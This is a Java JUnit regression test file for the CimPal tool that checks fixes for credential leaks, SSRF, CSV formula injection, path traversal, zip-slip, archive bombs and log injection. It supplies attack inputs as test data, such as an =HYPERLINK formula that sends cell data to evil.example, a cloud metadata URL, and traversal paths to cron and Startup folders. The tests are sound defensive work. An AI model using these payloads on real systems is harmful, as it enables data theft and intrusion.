/*
 * Copyright (c) 2020-2026 gridDigIt Kft.
 * Licensed under the EUPL-1.2-or-later.
 * SPDX-License-Identifier: EUPL-1.2+
 */
package eu.griddigit.cimpal.core.utils;

import eu.griddigit.cimpal.core.diffexport.ComparisonCsvWriter;
import eu.griddigit.cimpal.core.diffexport.ComparisonOperationRow;
import eu.griddigit.cimpal.core.diffexport.Operation;
import eu.griddigit.cimpal.core.testsupport.SourceScan;
import eu.griddigit.cimpal.core.models.MappingValidationOptions;
import eu.griddigit.cimpal.core.models.MappingValidationSummary;
import eu.griddigit.cimpal.core.testsupport.TestModels;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import javax.net.ssl.SSLSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpHeaders;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFileAttributeView;
import java.nio.file.attribute.PosixFilePermissions;
import java.util.List;
import java.util.Optional;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.junit.jupiter.api.Assumptions.assumeTrue;

/**
 * Regression tests for the remediated findings in SECURITY-SELF-ATTESTATION.md §4 (TEST-2). Each
 * test is named {@code F<n>_...} after its finding and fails if that remediation is reverted.
 * The finding to test map is in docs/plans/TEST-2.md. The remediation helpers are private, so
 * they are reached by reflection rather than widened for testing.
 */
class SecurityRegressionTest {

    @TempDir
    Path tempDir;

    // ---- reflection helpers ---------------------------------------------------------------

    private static Object call(Class<?> owner, String name, Class<?>[] types, Object... args) throws Throwable {
        Method method = owner.getDeclaredMethod(name, types);
        method.setAccessible(true);
        try {
            return method.invoke(null, args);
        } catch (InvocationTargetException e) {
            throw e.getCause();
        }
    }

    private static Object vt(String name, Class<?>[] types, Object... args) throws Throwable {
        return call(ValidationTools.class, name, types, args);
    }

    private static Object field(Class<?> owner, String name) throws Exception {
        Field f = owner.getDeclaredField(name);
        f.setAccessible(true);
        return f.get(null);
    }

    // ---- F1: credential disclosure --------------------------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {
            "https://evil.example/github.com/x.ttl",
            "https://github.com.evil.example/x.ttl",
            "https://evil.example/x.ttl?u=api.github.com",
            "https://api.github.com@evil.example/x.ttl",
            "https://evil.example/#raw.githubusercontent.com"})
    void F1_githubCredentialIsNeverAttachedForAHostThatMerelyMentionsGitHub(String url) throws Throwable {
        URI uri = URI.create(url);
        HttpRequest.Builder request = HttpRequest.newBuilder(uri);

        vt("addGitHubAuthHeader", new Class<?>[] {HttpRequest.Builder.class, URI.class}, request, uri);

        assertThat(request.build().headers().firstValue("Authorization")).isEmpty();
        assertThat((boolean) vt("willSendGitHubCredential", new Class<?>[] {URI.class}, uri)).isFalse();
    }

    @Test
    void F1_credentialHostsAreAnExactAllowlist() throws Exception {
        @SuppressWarnings("unchecked")
        Set<String> hosts = (Set<String>) field(ValidationTools.class, "GITHUB_AUTH_HOSTS");

        // Pinned: widening the set of hosts that receive the token must be a deliberate change.
        assertThat(hosts).containsExactlyInAnyOrder("raw.githubusercontent.com", "api.github.com", "github.com");
    }

    @Test
    void F1_credentialedClientNeverFollowsRedirects() throws Throwable {
        HttpClient credentialed = (HttpClient) vt("newHttpClient", new Class<?>[] {boolean.class}, true);
        HttpClient anonymous = (HttpClient) vt("newHttpClient", new Class<?>[] {boolean.class}, false);

        assertThat(credentialed.followRedirects()).isEqualTo(HttpClient.Redirect.NEVER);
        assertThat(anonymous.followRedirects()).isNotEqualTo(HttpClient.Redirect.ALWAYS);
    }

    // ---- F2: SSRF via owl:imports and workbook URLs -----------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {
            "http://raw.githubusercontent.com/o/r/main/x.ttl",
            "https://user:pw@raw.githubusercontent.com/o/r/main/x.ttl",
            "https://evil.example/x.ttl",
            "https://raw.githubusercontent.com.evil.example/x.ttl",
            "ftp://raw.githubusercontent.com/x.ttl",
            "https:///x.ttl"})
    void F2_egressGateRefusesNonHttpsCredentialsAndUnlistedHosts(String url) {
        assertThatThrownBy(() -> vt("requireAllowedRemoteUri", new Class<?>[] {String.class}, url))
                .isInstanceOf(IOException.class);
    }

    @Test
    void F2_egressGateAcceptsAnAllowlistedHttpsHost() throws Throwable {
        URI uri = (URI) vt("requireAllowedRemoteUri", new Class<?>[] {String.class},
                "https://raw.githubusercontent.com/o/r/main/x.ttl");

        assertThat(uri.getHost()).isEqualTo("raw.githubusercontent.com");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "https://127.0.0.1/x.ttl", "https://[::1]/x.ttl", "https://169.254.169.254/latest/meta-data/",
            "https://10.0.0.1/x.ttl", "https://172.16.0.1/x.ttl", "https://192.168.1.1/x.ttl",
            "https://0.0.0.0/x.ttl", "https://224.0.0.1/x.ttl", "https://[fe80::1]/x.ttl"})
    void F2_publicHostCheckRefusesInternalAddresses(String url) {
        assertThatThrownBy(() -> vt("requirePublicHost", new Class<?>[] {URI.class}, URI.create(url)))
                .isInstanceOf(IOException.class)
                .hasMessageContaining("non-public");
    }

    @Test
    void F2_oversizedResponseBodyIsRefused() throws Exception {
        long limit = (long) field(ValidationTools.class, "MAX_REMOTE_BODY_BYTES");
        byte[] body = new byte[Math.toIntExact(limit + 1)];

        assertThatThrownBy(() -> vt("requireBoundedBody", new Class<?>[] {HttpResponse.class, String.class},
                fakeResponse(body), "https://raw.githubusercontent.com/x.ttl"))
                .isInstanceOf(IOException.class)
                .hasMessageContaining("size limit");
    }

    /**
     * The plan asks that a refused import be "reported as an error, not a pass". Today a
     * refused or unresolvable import only prints a warning and the row is validated without
     * those shapes, so the result can look clean. Reported in TEST-2.md, not fixed here.
     */
    @Test
    @Disabled("TEST-2 finding: a refused owl:imports is a warning, not an error (see docs/plans/TEST-2.md)")
    void F2_refusedImportFailsTheRowInsteadOfPassing() throws Exception {
        Files.createDirectories(tempDir.resolve("models"));
        Files.createDirectories(tempDir.resolve("constraints"));
        Files.writeString(tempDir.resolve("models/data.xml"), TestModels.VIOLATING_THING_MODEL);
        // The only shapes are in the refused import, so the row would look conforming.
        Files.writeString(tempDir.resolve("constraints/shapes.ttl"), """
                @prefix owl: <http://www.w3.org/2002/07/owl#> .
                <urn:test:shapes> a owl:Ontology ; owl:imports <https://evil.example/shapes.ttl> .
                """);
        MappingValidationSummary summary = new MappingValidator(MappingValidationOptions.builder()
                .mappingCsv(Files.writeString(tempDir.resolve("mapping.csv"),
                        "xml_inputs,ttl,notes\ndata.xml,shapes.ttl,check\n"))
                .modelsInput(tempDir.resolve("models"))
                .constraintsRoot(tempDir.resolve("constraints"))
                .outputDir(tempDir.resolve("out"))
                .xmlBase(TestModels.XML_BASE)
                .threads(1)
                .build()).validate();

        assertThat(summary.conforming()).isZero();
        assertThat(summary.errors()).isEqualTo(1);
    }

    // ---- F4: formula injection in CSV --------------------------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {"=HYPERLINK(\"https://evil.example/?d=\"&A1,\"ok\")", "+1+1", "-2+3", "@SUM(A1)", "\tcmd", "\rcmd"})
    void F4_comparisonCsvNeutralisesFormulaTriggers(String payload) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        new ComparisonCsvWriter().write(out, List.of(
                new ComparisonOperationRow(payload, payload, payload, payload, payload, Operation.ADD)));

        String csv = out.toString(StandardCharsets.UTF_8);
        String dataLine = csv.lines().skip(1).findFirst().orElseThrow();
        for (String cell : dataLine.split(",(?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)")) {
            String unquoted = cell.startsWith("\"") ? cell.substring(1) : cell;
            assertThat(unquoted).as("cell %s", cell).doesNotStartWith("=").doesNotStartWith("+")
                    .doesNotStartWith("-").doesNotStartWith("@").doesNotStartWith("\t").doesNotStartWith("\r");
        }
    }

    // ---- F5: cache filename traversal -----------------------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {
            "https://raw.githubusercontent.com/o/r/main/a\\..\\..\\..\\Users\\Public\\Startup\\evil.xml",
            "https://raw.githubusercontent.com/o/r/main/../../../../etc/cron.d/evil.xml",
            "https://raw.githubusercontent.com/o/r/main/..%2F..%2Fevil.xml",
            "https://raw.githubusercontent.com/o/r/main/.hidden.xml",
            "https://raw.githubusercontent.com/o/r/main/x.xml?a=/../../evil.xml"})
    void F5_cacheFileNameCannotEscapeTheCacheDirectory(String url) throws Throwable {
        String name = (String) vt("safeCacheFileName", new Class<?>[] {String.class}, url);

        assertThat(name).matches("[A-Za-z0-9._-]+").doesNotContain("..").doesNotStartWith(".");
        Path cache = tempDir.resolve("cache");
        assertThat(cache.resolve(name).normalize().getParent()).isEqualTo(cache);
    }

    // ---- F6: shared temp and fixed paths --------------------------------------------------

    @Test
    void F6_cachesAndDebugLogLiveInThePerUserDirectoryNotTheSharedTemp() throws Throwable {
        Path userData = ((Path) vt("userDataDir", new Class<?>[0])).toAbsolutePath().normalize();
        Path tmp = Path.of(System.getProperty("java.io.tmpdir")).toAbsolutePath().normalize();
        Path cache = ((Path) field(ValidationTools.class, "REMOTE_XML_CACHE_DIR")).toAbsolutePath().normalize();
        Path log = ((Path) field(ValidationTools.class, "DEBUG_LOG_PATH")).toAbsolutePath().normalize();

        assertThat(cache).startsWith(userData);
        assertThat(log).startsWith(userData);
        assertThat(userData.startsWith(tmp)).as("%s must not be under %s", userData, tmp).isFalse();
        assertThat(log.toString()).doesNotContainIgnoringCase("C:\\Temp");
    }

    @Test
    void F6_privateDirectoryIsOwnerOnlyOnPosix() throws Throwable {
        Path dir = tempDir.resolve("private");
        vt("createPrivateDirectory", new Class<?>[] {Path.class}, dir);

        PosixFileAttributeView posix = Files.getFileAttributeView(dir, PosixFileAttributeView.class);
        assumeTrue(posix != null, "POSIX permissions only");
        assertThat(PosixFilePermissions.toString(posix.readAttributes().permissions())).isEqualTo("rwx------");
    }

    // ---- F7: archive expansion limits -------------------------------------------------------

    @Test
    void F7_entryCountLimitTrips() throws Exception {
        int limit = (int) field(ModelFactory.class, "MAX_ZIP_ENTRIES");
        Path zip = tempDir.resolve("many.zip");
        try (ZipOutputStream out = new ZipOutputStream(Files.newOutputStream(zip))) {
            for (int i = 0; i <= limit; i++) {
                out.putNextEntry(new ZipEntry("e" + i + ".xml"));
                out.closeEntry();
            }
        }

        assertThatThrownBy(() -> ModelFactory.unzip(zip.toFile()))
                .isInstanceOf(RuntimeException.class)
                .hasRootCauseMessage("Archive exceeds the entry limit (" + limit + ")");
    }

    @Test
    void F7_nestingDepthLimitTrips() throws Exception {
        int depthLimit = (int) field(ModelFactory.class, "MAX_ZIP_NESTING_DEPTH");
        byte[] archive = zipOf("leaf.xml", "<x/>".getBytes(StandardCharsets.UTF_8));
        for (int i = 0; i <= depthLimit + 1; i++) {
            archive = zipOf("inner" + i + ".zip", archive);
        }

        byte[] nested = archive;
        assertThatThrownBy(() -> ModelFactory.unzip(new java.io.ByteArrayInputStream(nested)))
                .isInstanceOf(RuntimeException.class)
                .hasStackTraceContaining("depth limit");
    }

    @Test
    void F7_brokenArchiveFailsInsteadOfYieldingAPartialModel() throws Exception {
        byte[] archive = zipOf("a.xml", "<x/>".repeat(1000).getBytes(StandardCharsets.UTF_8));
        Path truncated = Files.write(tempDir.resolve("broken.zip"), java.util.Arrays.copyOf(archive, archive.length / 2));

        assertThatThrownBy(() -> ModelFactory.unzip(truncated.toFile())).isInstanceOf(RuntimeException.class);
    }

    @Test
    void F7_onDemandZipInputHasAnEntryLimit() throws Exception {
        int limit = (int) field(ValidationTools.class, "MAX_ZIP_XML_ENTRIES");
        Path zip = tempDir.resolve("many-xml.zip");
        try (ZipOutputStream out = new ZipOutputStream(Files.newOutputStream(zip))) {
            for (int i = 0; i <= limit; i++) {
                out.putNextEntry(new ZipEntry("m" + i + ".xml"));
                out.closeEntry();
            }
        }

        assertThatThrownBy(() -> ValidationTools.scanZipXmlEntries(zip))
                .isInstanceOf(IOException.class)
                .hasMessageContaining("entry limit");
    }

    // ---- F8: archive-extraction guard -------------------------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {"../evil.xml", "sub/../../evil.xml", "..\\evil.xml"})
    void F8_zipSlipEntryIsRefused(String entryName) throws Exception {
        Path zip = tempDir.resolve("slip.zip");
        Files.write(zip, zipOf(entryName, "<x/>".getBytes(StandardCharsets.UTF_8)));

        assertThatThrownBy(() -> ValidationTools.scanZipXmlEntries(zip))
                .isInstanceOf(IOException.class)
                .hasMessageContaining("Unsafe ZIP entry path");
    }

    @Test
    void F8_destinationGuardIsAStrictNormalisedContainmentCheck() {
        String base = tempDir.resolve("out").toString();

        assertThat(ModelFactory.isValidDestPath(base, tempDir.resolve("out/a.xml").toString())).isTrue();
        assertThat(ModelFactory.isValidDestPath(base, tempDir.resolve("out/../escape.xml").toString())).isFalse();
        assertThat(ModelFactory.isValidDestPath(base, tempDir.resolve("out-sibling/a.xml").toString())).isFalse();
        assertThat(ModelFactory.isValidDestPath(base, base)).isFalse();
        assertThat(ModelFactory.isValidDestPath(base + "/./", tempDir.resolve("out/b.xml").toString())).isTrue();
    }

    // ---- F9: log injection ------------------------------------------------------------------

    @ParameterizedTest
    @ValueSource(strings = {"\r", "\n", "\u0085", "\u2028", "\u2029"})
    void F9_lineTerminatorsInLoggedValuesAreNeutralised(String terminator) throws Throwable {
        String logged = (String) vt("forLog", new Class<?>[] {String.class},
                "x.ttl" + terminator + "[ERROR] forged record");

        assertThat(logged).doesNotContain(terminator).contains("\u241e");
    }

    @Test
    void F9_loggedValuesAreBoundedAndUrlQueriesRedacted() throws Throwable {
        String long_ = (String) vt("forLog", new Class<?>[] {String.class}, "a".repeat(5000));
        String url = (String) vt("urlForLog", new Class<?>[] {String.class},
                "https://raw.githubusercontent.com/x.ttl?token=secret123&sig=abc");

        assertThat(long_.length()).isLessThanOrEqualTo(515);
        assertThat(url).doesNotContain("secret123").doesNotContain("sig=abc").contains("<redacted>");
    }

    // ---- F10: hardcoded internal paths ------------------------------------------------------

    @Test
    void F10_noDeveloperWorkstationPathsInShippedSources() throws Exception {
        List<String> offending = SourceScan.stringLiteralsMatching(
                "(?i)(C:\\\\\\\\GitHub\\\\\\\\relicapgrid|C:\\\\\\\\SHACL-Constraints|C:\\\\\\\\Temp\\\\\\\\cimpal)",
                "CimPal-Core", "CimPal-Main", "CimPal-CLI", "CimPal-CustomWriter");

        assertThat(offending).isEmpty();
    }

    // ---- F11: error handling ----------------------------------------------------------------

    @Test
    void F11_noBarePrintStackTraceInCoreOrMain() throws Exception {
        List<String> offending = SourceScan.linesMatching("\\.printStackTrace\\(\\s*\\)", "CimPal-Core", "CimPal-Main");

        assertThat(offending).isEmpty();
    }

    // ---- F12: dependency and observability configuration ------------------------------------

    @Test
    void F12_noEndOfLifeOrSilencingDependenciesAndScannersStayConfigured() throws Exception {
        String allPoms = SourceScan.read("pom.xml") + SourceScan.read("CimPal-Core/pom.xml")
                + SourceScan.read("CimPal-Main/pom.xml") + SourceScan.read("CimPal-CustomWriter/pom.xml")
                + SourceScan.read("CimPal-CLI/pom.xml");

        assertThat(allPoms).doesNotContain("<artifactId>jena-csv</artifactId>")
                .doesNotContain("<artifactId>commons-math4-core</artifactId>")
                .doesNotContain("<artifactId>slf4j-nop</artifactId>");
        String root = SourceScan.read("pom.xml");
        assertThat(root).contains("<artifactId>cyclonedx-maven-plugin</artifactId>")
                .contains("<id>security-scan</id>")
                .contains("<artifactId>dependency-check-maven</artifactId>");
        assertThat(SourceScan.read("CimPal-Main/src/main/java/module-info.java"))
                .doesNotContain("org.slf4j.nop");
    }

    // ---- helpers ----------------------------------------------------------------------------

    private static byte[] zipOf(String entryName, byte[] content) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        try (ZipOutputStream out = new ZipOutputStream(bytes)) {
            out.putNextEntry(new ZipEntry(entryName));
            out.write(content);
            out.closeEntry();
        }
        return bytes.toByteArray();
    }

    private static HttpResponse<byte[]> fakeResponse(byte[] body) {
        return new HttpResponse<>() {
            @Override public int statusCode() { return 200; }
            @Override public HttpRequest request() { return HttpRequest.newBuilder(URI.create("https://x")).build(); }
            @Override public Optional<HttpResponse<byte[]>> previousResponse() { return Optional.empty(); }
            @Override public HttpHeaders headers() { return HttpHeaders.of(java.util.Map.of(), (a, b) -> true); }
            @Override public byte[] body() { return body; }
            @Override public Optional<SSLSession> sslSession() { return Optional.empty(); }
            @Override public URI uri() { return URI.create("https://x"); }
            @Override public HttpClient.Version version() { return HttpClient.Version.HTTP_1_1; }
        };
    }
}
